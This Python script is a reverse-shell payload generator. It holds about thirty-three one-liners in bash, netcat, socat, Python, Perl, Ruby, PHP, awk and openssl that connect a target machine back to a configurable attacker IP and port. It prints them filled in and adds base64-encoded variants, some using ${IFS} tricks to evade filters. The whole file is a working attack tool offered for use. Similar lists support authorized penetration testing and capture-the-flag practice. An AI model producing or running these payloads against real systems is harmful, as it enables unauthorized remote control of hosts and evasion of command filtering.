#!/usr/bin/env python3
import base64

IP = "127.0.0.1"  # CHANGE
PORT = "9999"     # CHANGE

payloads = [
    "bash -i >& /dev/tcp/${IP}/${PORT} 0>&1",
    "bash -c 'bash -i >& /dev/tcp/${IP}/${PORT} 0>&1'",
    "sh -i >& /dev/tcp/${IP}/${PORT} 0>&1",
    "exec 3<>/dev/tcp/${IP}/${PORT};cat <&3 | while read line; do $line 2>&3 >&3; done",
    "exec 3<>/dev/tcp/${IP}/${PORT};/bin/bash <&3 >&3 2>&3",
    "bash -c 'exec 1<>/dev/tcp/${IP}/${PORT};exec 0<&1;exec 2<&1;exec /bin/bash -i'",
    "bash -i >& /dev/tcp/${IP}/${PORT} 0>&1 &",
    "nohup bash -i >& /dev/tcp/${IP}/${PORT} 0>&1 &",
    "setsid bash -i >& /dev/tcp/${IP}/${PORT} 0>&1",
    "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${IP} ${PORT} >/tmp/f",
    "nc ${IP} ${PORT} -e /bin/bash",
    "nc ${IP} ${PORT} -e /bin/sh",
    "mknod /tmp/backpipe p;/bin/bash </tmp/backpipe | nc ${IP} ${PORT} > /tmp/backpipe",
    "bash -i 2>&1 | nc ${IP} ${PORT}",
    "socat TCP:${IP}:${PORT} EXEC:/bin/sh",
    "socat TCP:${IP}:${PORT} EXEC:/bin/bash,pty,stderr,setsid,sigchld",
    "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${IP}\",${PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${IP}\",${PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    "python3 -c 'import os,socket;s=socket.socket();s.connect((\"${IP}\",${PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.system(\"bash -i\")'",
    "python -c \"__import__('os').system('bash -i >& /dev/tcp/${IP}/${PORT} 0>&1')\"",
    "perl -e 'use Socket;\\$i=\"${IP}\";\\$p=${PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\\$p,inet_aton(\\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
    "ruby -rsocket -e 'c=TCPSocket.new(\"${IP}\",${PORT});\\$stdin.reopen(c);\\$stdout.reopen(c);\\$stderr.reopen(c);exec \"/bin/sh -i\"'",
    "php -r '\\$sock=fsockopen(\"${IP}\",${PORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "awk 'BEGIN {system(\"bash -i >& /dev/tcp/${IP}/${PORT} 0>&1\")}'",
    "mkfifo /tmp/s; sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ${IP}:${PORT} > /tmp/s; rm /tmp/s",
    "zsh -c 'bash -i >& /dev/tcp/${IP}/${PORT} 0>&1'",
    "ksh -c 'bash -i >& /dev/tcp/${IP}/${PORT} 0>&1'",
    "dash -c 'bash -i >& /dev/tcp/${IP}/${PORT} 0>&1'",
    "/bin/bash -i >& /dev/tcp/${IP}/${PORT} 0>&1",
    "bash -c 'while true; do bash -i >& /dev/tcp/${IP}/${PORT} 0>&1; sleep 5; done'",
    "bash -i >& /dev/udp/${IP}/${PORT} 0>&1",
    "{ bash -i; } 2>&1 | nc ${IP} ${PORT}",
    "echo \"bash -i >& /dev/tcp/${IP}/${PORT} 0>&1\" | bash",
]

def sub(p):
    return p.replace("${IP}", IP).replace("${PORT}", PORT)

def to_b64(cmd):
    return base64.b64encode(cmd.encode()).decode()

print(f"[*] Reverse shells for {IP}:{PORT}\n")

for i, p in enumerate(payloads, 1):
    s = sub(p)
    print(f"[{i}] {s}")

print(f"\n[*] Base64 \n")

for i, p in enumerate(payloads[:5], 1):
    s = sub(p)
    b64 = to_b64(s)
    print(f"[B{i}] bash -c 'echo {b64} | base64 -d | bash'")
    print(f"[B{i}] echo${{IFS}}{b64}|base64${{IFS}}-d|bash")
    print(f"[B{i}] echo {b64} | base64 -d | bash ")
